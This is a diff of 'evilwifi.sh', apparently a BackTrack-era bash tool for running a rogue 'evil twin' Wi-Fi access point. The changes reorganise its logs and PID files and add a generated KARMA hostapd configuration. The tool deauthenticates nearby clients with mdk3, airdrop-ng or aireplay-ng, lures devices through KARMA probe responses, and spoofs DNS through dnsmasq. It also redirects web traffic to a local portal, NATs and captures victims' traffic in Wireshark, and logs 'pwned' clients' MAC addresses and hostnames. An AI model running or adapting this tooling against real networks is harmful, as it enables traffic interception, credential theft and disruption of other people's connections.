@@ -27,15 +27,17 @@ termwidth=130
 folder=~/.evilwifi
 initpath=`pwd`
 settings=evilwifi.conf
-sessionfolder=$folder/SESSION_$RANDOM
-LOG=$sessionfolder/evilwifi.log
-MAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
-TAPIFACE=at0
 if [ -d != $folder ]; then mkdir $folder 2> /dev/null; fi
-if [ -f $settings ]; then readconfig; fi
+sessionfolder=$folder/SESSION_$RANDOM
 mkdir $sessionfolder
+mkdir $sessionfolder/logs
+mkdir $sessionfolder/pids
+mkdir $sessionfolder/pcaps
+LOG=$sessionfolder/logs/evilwifi.log
+MAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
+if [ -f $settings ]; then echo "Reading Config File..."; fi
 touch $LOG
-touch $folder/missing.log
+touch $sessionfolder/logs/missing.log
 ######################
 function banner(){
 echo "
@@ -94,7 +96,7 @@ function checkupdate(){
 echo "+===================================+"
 echo "| RUNNING SCRIPT UPDATE CHECK       |"
 echo "+===================================+"
-newrevision=$(curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/README | grep REVISION= | cut -d'=' -f2)
+newrevision=$(curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/VERSION | grep REVISION= | cut -d'=' -f2)
 if [ "$newrevision" -gt "$REVISION" ]; then update;
 else
 echo ""
@@ -108,10 +110,10 @@ echo ""
 echo "#####################################"
 echo "# ATTEMPTING TO DOWNLOAD UPDATE     #"
 echo "#####################################"
-wget -nv -t 1 -T 10 -O accesspoint.sh.tmp https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/accesspoint.sh
-if [ -f accesspoint.sh.tmp ]; then rm accesspoint.sh; mv accesspoint.sh.tmp accesspoint.sh;
+wget -nv -t 1 -T 10 -O evilwifi.sh.tmp https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/evilwifi.sh
+if [ -f evilwifi.sh.tmp ]; then rm evilwifi.sh; mv evilwifi.sh.tmp evilwifi.sh;
 echo "CHMOD & EXIT"
-chmod 755 accesspoint.sh
+chmod 755 evilwifi.sh
 read -e -p "Update [$OK] " enter
 exit 0
 else
@@ -137,41 +139,38 @@ cd hostapd-1.0-karma
 make && make install
 cd $initpath
 }
-function hostapdkarma(){
-hostapd -f $sessionfolder/hostapd.log ~/hostapd-karma.conf -B
-}
 function pspids(){
-pgrep airbase-ng > $sessionfolder/airbase-ng.pid
-pgrep dnsmasq > $sessionfolder/dnsmasq.pid
-pgrep hostapd > $sessionfolder/hostapd.pid
+pgrep airbase-ng > $sessionfolder/pids/airbase-ng.pid
+pgrep dnsmasq > $sessionfolder/pids/dnsmasq.pid
+pgrep hostapd > $sessionfolder/pids/hostapd.pid
 }
 function stopshit(){
 pspids
 service apache2 stop &>$LOG
 service dhcp3-server stop &>$LOG
-while [ -s $sessionfolder/airbase-ng.pid ]; do
+while [ -s $sessionfolder/pids/airbase-ng.pid ]; do
 sleep 2
 pspids
 echo "Killing Airbase-NG"
-kill `awk '{ print $1 }' < <(cat $sessionfolder/airbase-ng.pid)` &>/dev/null
+kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/airbase-ng.pid)` &>/dev/null
 done
-while [ -s $sessionfolder/hostapd.pid ]; do
+while [ -s $sessionfolder/pids/hostapd.pid ]; do
 sleep 2
 pspids
 echo "Killing Hostapd"
-kill -9 `awk '{ print $1 }' < <(cat $sessionfolder/airbase-ng.pid)` &>/dev/null
+kill -9 `awk '{ print $1 }' < <(cat $sessionfolder/pids/airbase-ng.pid)` &>/dev/null
 airmon-ng stop mon.$TAPIFACE &>/dev/null
 done
-while [ -s $sessionfolder/dnsmasq.pid ]; do
+while [ -s $sessionfolder/pids/dnsmasq.pid ]; do
 sleep 2
 pspids
 echo "Killing DNSMASQ"
-kill `awk '{ print $1 }' < <(cat $sessionfolder/dnsmasq.pid)` &>/dev/null
+kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dnsmasq.pid)` &>/dev/null
 done
-for pid in `ls $folder/*.pid 2>$LOG`; do if [ -s "$pid" ]; then
-kill `cat $folder/probe.pid 2>$LOG` &>/dev/null
-kill `cat $folder/pwned.pid 2>$LOG` &>/dev/null
-kill `cat $folder/web.pid 2>$LOG` &>/dev/null
+for pid in `ls $sessionfolder/pids/*.pid 2>$LOG`; do if [ -s "$pid" ]; then
+kill `cat $sessionfolder/pids/probe.pid 2>$LOG` &>/dev/null
+kill `cat $sessionfolder/pids/pwned.pid 2>$LOG` &>/dev/null
+kill `cat $sessionfolder/pids/web.pid 2>$LOG` &>/dev/null
 kill `cat $pid 2>$LOG` &>/dev/null
 fi; done
 if [ -f /var/run/dhcpd/$TAPIFACE.pid ]; then
@@ -191,8 +190,8 @@ function firewall(){
 iptables -P FORWARD ACCEPT
 iptables -P INPUT ACCEPT
 #iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
-#iptables -A INPUT -i lo -j ACCEPT
-#iptables -t nat -A POSTROUTING -j MASQUERADE
+iptables -A INPUT -i lo -j ACCEPT
+iptables -t nat -A POSTROUTING -j MASQUERADE
 echo "1" > /proc/sys/net/ipv4/ip_forward
 }
 function firewallportal(){
@@ -201,7 +200,46 @@ iptables -t mangle -A PREROUTING -i $TAPIFACE -p tcp -m tcp --dport 80 -j intern
 iptables -t mangle -A internet -j MARK --set-mark 99
 iptables -t nat -A PREROUTING -i $TAPIFACE -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to-destination $TAPIP
 }
-function dhcpd3server(){
+function hostapdconfig(){
+TAPIFACE=$ATHIFACE
+karma_enabled=1
+echo "enable_karma=$karma_enabled" > $folder/hostapd.conf
+echo "karma_black_white=1" >> $folder/hostapd.conf
+echo "interface=$TAPIFACE" >> $folder/hostapd.conf
+echo "logger_syslog=-1" >> $folder/hostapd.conf
+echo "logger_syslog_level=0" >> $folder/hostapd.conf
+echo "logger_stdout=-1" >> $folder/hostapd.conf
+echo "logger_stdout=0" >> $folder/hostapd.conf
+echo "dump_file=$sessionfolder/logs/hostapd.dump" >> $folder/hostapd.conf
+echo "ctrl_interface=/var/run/hostapd" >> $folder/hostapd.conf
+echo "ctrl_interface_group=0" >> $folder/hostapd.conf
+echo "ssid=$ESSID" >> $folder/hostapd.conf
+echo "hw_mode=g" >> $folder/hostapd.conf
+echo "channel=$CHAN" >> $folder/hostapd.conf
+echo "beacon_int=$BEAINT" >> $folder/hostapd.conf
+echo "dtim_period=2" >> $folder/hostapd.conf
+echo "max_num_sta=2000" >> $folder/hostapd.conf
+echo "rts_threshold=2347" >> $folder/hostapd.conf
+echo "fragm_threshold=2346" >> $folder/hostapd.conf
+echo "macaddr_acl=0" >> $folder/hostapd.conf
+#echo "accept_mac_file=$sessionfolder/hostapd.accept" >> $folder/hostapd.conf
+#echo "deny_mac_file=$sessionfolder/hostapd.deny" >> $folder/hostapd.conf
+echo "auth_algs=3" >> $folder/hostapd.conf
+echo "ignore_broadcast_ssid=0" >> $folder/hostapd.conf
+#echo "wep_default_key=0" >> $folder/hostapd.conf
+#echo "wep_key0=123456789a" >> $folder/hostapd.conf
+echo "ap_max_inactivity=300" >> $folder/hostapd.conf
+echo "disassoc_low_ack=1" >> $folder/hostapd.conf
+#echo "ap_isolate=1" >> $folder/hostapd.conf
+#echo "ieee80211n=1" >> $folder/hostapd.conf
+#echo "access_network_type=0" >> $folder/hostapd.conf
+}
+function starthostapd(){
+echo "starting hostapd....."
+hostapd -f $sessionfolder/logs/hostapd.log -P $sessionfolder/pids/hostapd.pid $folder/hostapd.conf -B
+sleep 20
+}
+function dhcpd3config(){
 echo "* DHCPD3 SERVER!!! *"
 replace INTERFACES=\"\" INTERFACES=\"$TAPIFACE\" -- /etc/default/dhcp3-server
 echo "" > /var/lib/dhcp3/dhcpd.leases
@@ -231,7 +269,7 @@ echo "}" >> $dhcpconf
 gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
 "dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/$TAPIFACE.pid $TAPIFACE"
 }
-function dnsmasqserver(){
+function dnsmasqconfig(){
 echo "address=/$DNSURL/$TAPIP" > /etc/dnsmasq.conf
 echo "dhcp-authoritative" >> /etc/dnsmasq.conf
 echo "dhcp-lease-max=102" >> /etc/dnsmasq.conf
@@ -268,12 +306,12 @@ ifconfig br-lan up
 iptables -A FORWARD -i br-lan -j ACCEPT
 echo ""
 echo "* ATTEMPTING TO BRIDGE ON $LANIFACE (br-lan) *"
-dhclient3 br-lan &>$sessionfolder/bridge.log
-BRLANDHCP=$(awk '/DHCPOFFERS/ { print $1 }' < <(cat $sessionfolder/bridge.log))
+dhclient3 br-lan &>$sessionfolder/logs/bridge.log
+BRLANDHCP=$(awk '/DHCPOFFERS/ { print $1 }' < <(cat $sessionfolder/logs/bridge.log))
 while [ "$BRLANDHCP" = "No" ]; do
 echo ""
 echo "* No DHCP Server Found On $LANIFACE (br-lan) [$FAIL] *"
-rm $sessionfolder/bridge.log
+rm $sessionfolder/logs/bridge.log
 brlandown
 sleep 2
 brlan
@@ -289,8 +327,8 @@ function apachesetup(){
 echo "ErrorDocument 404 /404.php" > /etc/apache2/conf.d/localized-error-pages
 echo > /var/log/apache2/access.log
 echo > /var/log/apache2/error.log
-ln -s /var/log/apache2/access.log $sessionfolder/access.log
-ln -s /var/log/apache2/error.log $sessionfolder/error.log
+ln -s /var/log/apache2/access.log $sessionfolder/logs/access.log
+ln -s /var/log/apache2/error.log $sessionfolder/logs/error.log
 APACHECONF=/etc/apache2/sites-available
 if [ -f $APACHECONF/default~ ]; then cp $APACHECONF/default~ $APACHECONF/default;
 else cp $APACHECONF/default $APACHECONF/default~; fi
@@ -327,10 +365,10 @@ ifconfig $ATHIFACE down
 sleep 2
 }
 function monitormodestart(){
-airmon-ng check kill > $sessionfolder/monitormodepslist.log
+airmon-ng check kill > $sessionfolder/logs/monitormodepslist.log
 echo "* ATTEMPTING TO START MONITOR-MODE ($ATHIFACE) *"
-airmon-ng start $ATHIFACE $CHAN > $sessionfolder/monitormode.log
-MONIFACE=`awk '/enabled/ { print $5 }' $sessionfolder/monitormode.log | head -c -2`
+airmon-ng start $ATHIFACE $CHAN > $sessionfolder/logs/monitormode.log
+MONIFACE=`awk '/enabled/ { print $5 }' $sessionfolder/logs/monitormode.log | head -c -2`
 if [ "$SPOOFMAC" != "" ]; then
 macchanger -m $SPOOFMAC $MONIFACE
 fi
@@ -408,7 +446,7 @@ read -e -p "Option: " attack
 if [ "$attack" = "" ]; then clear; attackmenu; fi
 }
 function startairbase(){
-airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
+airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
 }
 function startdnsmasq(){
 echo "no-poll" >> /etc/dnsmasq.conf
@@ -429,14 +467,14 @@ echo "* Not Using A Local DHCP Server *"
 function taillogs(){
 echo > /var/log/syslog
 # for (i=9; i<=NF; i++)
-echo "echo \$$ > $folder/probe.pid" > $folder/probe.sh
-echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $folder/airbaseng.log)" >> $folder/probe.sh
-echo "echo \$$ > $folder/pwned.pid" > $folder/pwned.sh
-echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $folder/airbaseng.log) &" >> $folder/pwned.sh
+echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
+echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $sessionfolder/logs/airbaseng.log)" >> $folder/probe.sh
+echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
+echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $sessionfolder/logs/airbaseng.log) &" >> $folder/pwned.sh
 echo "awk '/DHCPACK/ && /$TAPIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
-echo "echo \$$ > $folder/web.pid" > $folder/web.sh
+echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
 #echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
-echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/access.log)" >> $folder/web.sh
+echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/logs/access.log)" >> $folder/web.sh
 chmod a+x $folder/probe.sh
 chmod a+x $folder/pwned.sh
 chmod a+x $folder/web.sh
@@ -454,11 +492,11 @@ echo ""
 echo "+===================================+"
 echo "| SCANNING NEARBY WIFIS             |"
 echo "+===================================+"
-iwlist $ATHIFACE scan | awk '/Address/ {print $5}' > $sessionfolder/scannedwifimaclist.txt
-echo "a/$MAC|any" > $sessionfolder/droprules.txt
-echo "d/any|any" >> $sessionfolder/droprules.txt
-echo "$MAC" > $sessionfolder/whitelist.txt
-isempty=$(ls -l $folder | awk '/scannedwifimaclist.txt/ {print $5}')
+iwlist $ATHIFACE scan | awk '/Address/ {print $5}' > $sessionfolder/logs/scannedwifimaclist.txt
+echo "a/$MAC|any" > $sessionfolder/logs/droprules.txt
+echo "d/any|any" >> $sessionfolder/logs/droprules.txt
+echo "$MAC" > $sessionfolder/logs/whitelist.txt
+isempty=$(ls -l $sessionfolder/logs | awk '/scannedwifimaclist.txt/ {print $5}')
 echo ""
 echo "+===================================+"
 echo "| DEAUTH PEOPLE                      "
@@ -471,18 +509,18 @@ echo ""
 read -e -p "Option: " DEAUTHPROG
 if [ "$DEAUTHPROG" = "1" ]; then
 DEAUTHPROG=mdk3
-gnome-terminal --geometry="$termwidth"x15 --hide-menubar -e "mdk3 $MONIFACE d -c $CHAN -w $sessionfolder/whitelist.txt"
+gnome-terminal --geometry="$termwidth"x15 --hide-menubar -e "mdk3 $MONIFACE d -c $CHAN -w $sessionfolder/logs/whitelist.txt"
 fi
 if [ "$DEAUTHPROG" = "3" ]; then
 DEAUTHPROG=airdrop-ng
 gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="AIRODUMP-NG" -e \
-"airodump-ng --output-format csv --write $sessionfolder/dump.csv $MONIFACE"
+"airodump-ng --output-format csv --write $sessionfolder/pcap/dump.csv $MONIFACE"
 sleep 5
 if [ -f != /usr/sbin/airdrop-ng ]; then
 ln -s /pentest/wireless/airdrop-ng/airdrop-ng /usr/sbin/airdrop-ng
 fi
 gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="AIRDROP-NG" -e \
-"airdrop-ng -i $MONIFACE -t $sessionfolder/dump.csv-01.csv -r $sessionfolder/droprules.txt"
+"airdrop-ng -i $MONIFACE -t $sessionfolder/pcap/dump.csv-01.csv -r $sessionfolder/logs/droprules.txt"
 fi
 if [ "$DEAUTHPROG" = "2" ]; then
 DEAUTHPROG=aireplay-ng
@@ -832,6 +870,9 @@ modprobe tun
 echo ""
 poisonmenu
 softapmenu
+if [ "$softap" = "0" ]; then TAPIFACE=at0; fi
+if [ "$softap" = "1" ]; then TAPIFACE=$ATHIFACE; fi
+echo "TAPIFACE $TAPIFACE"
 if [ "$mode" != "2" ]; then dhcpmenu; fi
 monitormodestop
 if [ -f != $settings ]; then
@@ -878,7 +919,7 @@ echo "* CHANNEL: $CHAN *"
 echo "* PACKETS PER SECOND: $PPS *"
 echo "* BEACON INTERVAL: $BEAINT *"
 if [ "$softap" = "0" ]; then monitormodestart; startairbase; fi
-if [ "$softap" = "1" ]; then hostapdkarma; fi
+if [ "$softap" = "1" ]; then hostapdconfig; starthostapd; fi
 sleep 2
 if [ "$mode" != "2" ]; then
 ifconfig $TAPIFACE up
@@ -887,9 +928,9 @@ ifconfig $TAPIFACE mtu $MTU;
 route add -net $TAPIPBLOCK netmask $NETMASK gw $TAPIP; fi
 wireshark -i $TAPIFACE -k &
 if [ "$mode" = "2" ]; then DHCPSERVER=4; fi
-if [ "$DHCPSERVER" = "1" ]; then dnsmasqserver; fi
-if [ "$DHCPSERVER" = "2" ]; then dhcpd3server; fi
-if [ "$DHCPSERVER" = "3" ]; then udhcpdserver; fi
+if [ "$DHCPSERVER" = "1" ]; then dnsmasqconfig; fi
+if [ "$DHCPSERVER" = "2" ]; then dhcpd3config; fi
+if [ "$DHCPSERVER" = "3" ]; then udhcpdconfig; fi
 if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
 if [ "$mode" = "1" ]; then
 apachesetup
@@ -897,7 +938,7 @@ apachecheck
 firewall
 iptables -A FORWARD -i $TAPIFACE -j ACCEPT
 #iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $TAPIP:53
-iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $TAPIP:53
+#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $TAPIP:53
 #iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $TAPIP:67
 #iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $TAPIP:67
 #iptables -t nat -A PREROUTING -p tcp --dport 68 -j DNAT --to-destination $TAPIP:68
